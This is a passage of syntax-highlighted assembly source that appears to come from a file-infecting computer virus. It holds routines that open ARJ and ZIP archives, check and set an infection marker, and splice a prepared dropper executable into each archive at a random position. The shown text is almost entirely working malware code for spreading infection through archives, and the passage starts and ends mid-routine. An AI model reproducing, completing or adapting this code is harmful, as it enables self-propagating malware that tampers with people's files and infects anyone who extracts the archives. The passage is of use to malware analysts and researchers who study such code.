        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iACR_dHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyCloseFile</span><span class="sc0">
    </span><span class="sc5">__iACR_dealloc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iACR_dMemory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mdealloc</span><span class="sc0">
    </span><span class="sc5">__iACR_fClose</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iACR_fHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyCloseFile</span><span class="sc0">

    </span><span class="sc5">__iACR_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ infection in ARJ archivez ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function infect ARJ archivez by my prepared dropper.</span><span class="sc0">
        </span><span class="sc1">;Dropper is compressed by ARJ (four method without store).</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  input:    filename_ptr ... pointer to an ARJ's filename</span><span class="sc0">
        </span><span class="sc1">;        NewARJ struc ... 's been filled? I dont know!</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  output:   nothing</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__iARJ_fHandle</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;archive's handle</span><span class="sc0">
        </span><span class="sc5">__iARJ_fFiles</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;number of files</span><span class="sc0">
        </span><span class="sc5">__iARJ_dHandle</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;dropper's handle</span><span class="sc0">
        </span><span class="sc5">__iARJ_dMemory</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;dropper's file body</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">infect_ARJ</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iARJ_fFiles</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; check whether dropper exists</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewARJ.dropper</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__iARJ_finish</span><span class="sc0">

        </span><span class="sc1">; open archive</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyOpenFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__iARJ_finish</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iARJ_fHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; check whether archive has been infected</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iARJ_fHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__get_archive_infected</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__iARJ_fClose</span><span class="sc0">

        </span><span class="sc1">; read archive header</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ARJ_struct</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;destination place</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">ARJNeededBytes</span><span class="sc0">  </span><span class="sc1">;needed bytes to read</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;file position</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iARJ_fHandle</span><span class="sc4">]</span><span class="sc1">;file handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyReadFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__iARJ_fClose</span><span class="sc0">

        </span><span class="sc1">; check archive's signatures</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ARJHeaderId</span><span class="sc4">],</span><span class="sc2">0EA60h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__iARJ_fClose</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ARJFlags</span><span class="sc4">],</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__iARJ_fClose</span><span class="sc0">       </span><span class="sc1">;multivolume flags, I guess</span><span class="sc0">

        </span><span class="sc1">; get number of files</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ARJ_struct</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;destination place</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ARJHeaderSize</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;file position</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">0000000Ah</span><span class="sc0">       </span><span class="sc1">;add up file-off</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">ARJNeededBytes</span><span class="sc0">  </span><span class="sc1">;needed bytes to read</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iARJ_fHandle</span><span class="sc4">]</span><span class="sc1">;file handle</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;first entry</span><span class="sc0">
    </span><span class="sc5">__iARJ_search_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__iARJ_next_file</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__iARJ_sEnd_1</span><span class="sc0">       </span><span class="sc1">;it isn't 100% error !</span><span class="sc0">

        </span><span class="sc1">; next file has been found</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iARJ_fFiles</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;increase files counter :)</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__iARJ_search_1</span><span class="sc0">

    </span><span class="sc5">__iARJ_sEnd_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;first entry</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">       </span><span class="sc1">;end of file ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__iARJ_fClose</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ARJHeaderSize</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__iARJ_fClose</span><span class="sc0">       </span><span class="sc1">;double security :)</span><span class="sc0">

        </span><span class="sc1">; generate my new archive file position</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iARJ_fFiles</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;number of files</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;new ECX: disable files</span><span class="sc0">

        </span><span class="sc1">; read file headers which aren't neccessary for me</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__iARJ_sEnd_2</span><span class="sc0">
    </span><span class="sc5">__iARJ_search_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__iARJ_next_file</span><span class="sc0">    </span><span class="sc1">;disable folders</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__iARJ_search_2</span><span class="sc0">
    </span><span class="sc5">__iARJ_sEnd_2</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; note: ESI = my new place :)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc1">; open dropper file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewARJ.dropper</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyOpenFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__iARJ_fClose</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iARJ_dHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; get dropper's file size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iARJ_dHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyGetFileSize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; get archive's file size and subtract my new place</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iARJ_fHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyGetFileSize</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;esi = my new place</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;archive's needed size</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;dropper's file size</span><span class="sc0">

        </span><span class="sc1">; allocate memory for dropper's file body</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iARJ_dMemory</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; read whole dropper's file body</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iARJ_dMemory</span><span class="sc4">]</span><span class="sc1">;destination place</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;number of bytes to read</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;file position</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iARJ_dHandle</span><span class="sc4">]</span><span class="sc1">;file handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyReadFile</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;archive's needed file size</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__iARJ_dClose</span><span class="sc0">

        </span><span class="sc1">; read "almost" whole archive file behind my dropper</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;new destination place</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">       </span><span class="sc1">;delete ending two flags</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;edi = my new place</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;number of bytes to read</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iARJ_fHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyReadFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__iARJ_dClose</span><span class="sc0">

        </span><span class="sc1">; "update" archive file :)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;end of readed datas</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iARJ_dMemory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iARJ_dMemory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">00000002h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000000Ah</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iARJ_fHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyWriteFile</span><span class="sc0">

        </span><span class="sc1">; archive has been infected</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iARJ_fHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__set_archive_infected</span><span class="sc0">

    </span><span class="sc5">__iARJ_dClose</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iARJ_dHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyCloseFile</span><span class="sc0">
    </span><span class="sc5">__iARJ_dealloc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iARJ_dMemory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mdealloc</span><span class="sc0">
    </span><span class="sc5">__iARJ_fClose</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iARJ_fHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyCloseFile</span><span class="sc0">

    </span><span class="sc5">__iARJ_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Set file position on the next entry</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;   input:   EDX ... destination buffer</span><span class="sc0">
        </span><span class="sc1">;        EBX ... file handle</span><span class="sc0">
        </span><span class="sc1">;        ESI ... some header's place (file position)</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;   output:  ESI ... next header position (if exists :)</span><span class="sc0">
        </span><span class="sc1">;        Cflags</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">__iARJ_next_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">ARJNeededBytes</span><span class="sc0">  </span><span class="sc1">;number of bytes to read</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyReadFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__iARJ_nf_check</span><span class="sc0">     </span><span class="sc1">;it isn't 100% error !</span><span class="sc0">

        </span><span class="sc1">; set file position on the next file</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ARJHeaderSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ARJCompressedSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000000Ah</span><span class="sc0">       </span><span class="sc1">;add up file-off</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">__iARJ_nf_check</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ infection in ZIP archivez ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function adds to ZIP archive  certain EXE file which</span><span class="sc0">
        </span><span class="sc1">;has been infected and compressed by PKZIP achiver program</span><span class="sc0">
        </span><span class="sc1">;Compressing method  has been selected randomly  from four</span><span class="sc0">
        </span><span class="sc1">;possibilities (without "store" method, of course).</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  input:    filename_ptr ... pointer to a ZIP's filename</span><span class="sc0">
        </span><span class="sc1">;        NewZIP struc ... has been filled? I dont know!</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  output:   nothing</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__iZIP_fHandle</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;archive's file handle</span><span class="sc0">
        </span><span class="sc5">__iZIP_fHeaders</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;archive's headers</span><span class="sc0">
        </span><span class="sc5">__iZIP_fNewDPos</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;a. pos for d. body</span><span class="sc0">
        </span><span class="sc5">__iZIP_fMemory</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;archive's file body</span><span class="sc0">

        </span><span class="sc5">__iZIP_dHandle</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;dropper's file handle</span><span class="sc0">
        </span><span class="sc5">__iZIP_dFSize</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;dropper's file size</span><span class="sc0">
        </span><span class="sc5">__iZIP_dMemory</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;dropper's file body</span><span class="sc0">
        </span><span class="sc5">__iZIP_dHSize</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;dropper's header s.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">infect_ZIP</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; check whether "NewZIP" struc has been filled</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewZIP.dropper</span><span class="sc4">],</span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__iZIP_finish</span><span class="sc0">

        </span><span class="sc1">; open archive file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename_ptr</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyOpenFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__iZIP_finish</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_fHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; check whether archive has been infected</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_fHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__get_archive_infected</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__iZIP_fClose</span><span class="sc0">

        </span><span class="sc1">; get archive file size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_fHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyGetFileSize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; read its 3rd table</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">ZIPEHeaderSize</span><span class="sc0">  </span><span class="sc1">;number of bytes to read</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ZIPReadBuffer</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;destination buffer</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">ZIPEHeaderSize</span><span class="sc0">  </span><span class="sc1">;file pos</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iZIP_fHandle</span><span class="sc4">]</span><span class="sc1">;file handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyReadFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__iZIP_fClose</span><span class="sc0">

        </span><span class="sc1">; check that table</span><span class="sc0">
